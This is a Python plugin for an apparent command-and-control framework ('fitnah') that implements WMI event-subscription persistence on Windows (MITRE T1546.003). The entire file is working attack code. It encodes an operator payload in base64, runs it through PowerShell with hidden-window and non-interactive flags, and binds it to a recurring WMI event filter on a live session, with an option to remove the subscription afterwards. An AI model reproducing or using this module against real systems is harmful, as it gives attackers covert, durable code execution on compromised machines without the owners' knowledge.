"""persistence/wmi_subscribe — WMI event subscription with correct base64 pre-encoding. MITRE T1546.003"""
import base64
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class WmiSubscribe(BasePlugin):
    NAME        = "wmi_subscribe"
    DESCRIPTION = "WMI CommandLineEventConsumer persistence. Base64 encodes payload on C2 side before embedding."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1546.003"
    CATEGORY    = "persistence"
    schema      = ParamSchema().add(
        Param("name",     str,  required=True,  help="Subscription name (unique identifier)"),
        Param("payload",  str,  required=False, default="",
              help="PowerShell command to run on trigger"),
        Param("interval", int,  required=False, default=60,
              help="WQL WITHIN interval seconds (default 60)"),
        Param("remove",   bool, required=False, default=False,
              help="Remove the subscription"),
    )

    @mitre("T1546.003")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")
        name     = params["name"]
        payload  = params.get("payload", "")
        interval = params.get("interval", 60)
        remove   = params.get("remove", False)

        if remove:
            ps = (
                f"Get-WMIObject -Namespace root\\subscription -Class __EventFilter"
                f" -Filter \"Name='{name}'\" -EA SilentlyContinue | Remove-WMIObject -EA SilentlyContinue;"
                f"Get-WMIObject -Namespace root\\subscription -Class CommandLineEventConsumer"
                f" -Filter \"Name='{name}'\" -EA SilentlyContinue | Remove-WMIObject -EA SilentlyContinue;"
                f"Get-WMIObject -Namespace root\\subscription -Class __FilterToConsumerBinding -EA SilentlyContinue |"
                f" Where-Object {{$_.Filter -match '{name}'}} | Remove-WMIObject -EA SilentlyContinue;"
                f"Write-Output 'WMI subscription removed: {name}'"
            )
        else:
            if not payload:
                return ModuleResult.err("payload is required when not removing")
            # Pre-encode payload to base64 on C2 side — fixes the bug where encoding was done at runtime
            encoded = base64.b64encode(payload.encode("utf-16-le")).decode("ascii")
            cmd_template = f"powershell -nop -w hidden -NonInteractive -EncodedCommand {encoded}"

            ps = (
                "$ns = 'root\\subscription';"
                f"$filter = Set-WMIInstance -Namespace $ns -Class __EventFilter -Arguments @{{"
                f"  Name='{name}';"
                f"  EventNameSpace='root\\cimv2';"
                f"  QueryLanguage='WQL';"
                f"  Query='SELECT * FROM __InstanceModificationEvent WITHIN {interval}"
                f" WHERE TargetInstance ISA \"Win32_PerfFormattedData_PerfOS_System\"'"
                f"}};"
                f"$consumer = Set-WMIInstance -Namespace $ns -Class CommandLineEventConsumer -Arguments @{{"
                f"  Name='{name}';"
                f"  CommandLineTemplate='{cmd_template}'"
                f"}};"
                f"Set-WMIInstance -Namespace $ns -Class __FilterToConsumerBinding"
                f" -Arguments @{{Filter=$filter;Consumer=$consumer}} | Out-Null;"
                f"Write-Output 'WMI subscription installed: {name}';"
                f"Write-Output 'Trigger: every {interval}s system perf event';"
                f"Write-Output 'Encoded payload length: {len(encoded)} chars'"
            )
        r = ctx.ps(ps)
        if r["status"] != "ok":
            return ModuleResult.err(r["output"])
        return ModuleResult.ok(data=r["output"])
